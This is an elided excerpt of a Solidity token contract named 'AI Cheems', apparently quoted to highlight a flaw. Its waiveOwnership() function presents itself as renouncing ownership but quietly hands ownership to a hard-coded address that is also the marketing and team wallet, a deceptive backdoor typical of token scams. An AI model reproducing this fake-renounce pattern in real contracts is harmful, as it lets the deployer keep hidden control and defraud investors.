...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x8eaDfD12F06cEDc2863CB65007dAbad78478CC77);
    }
...
contract AICheems is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "AI Cheems";
    string private _symbol = "AIC";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x8eaDfD12F06cEDc2863CB65007dAbad78478CC77);
    address payable private teamWalletAddress = payable(0x8eaDfD12F06cEDc2863CB65007dAbad78478CC77);
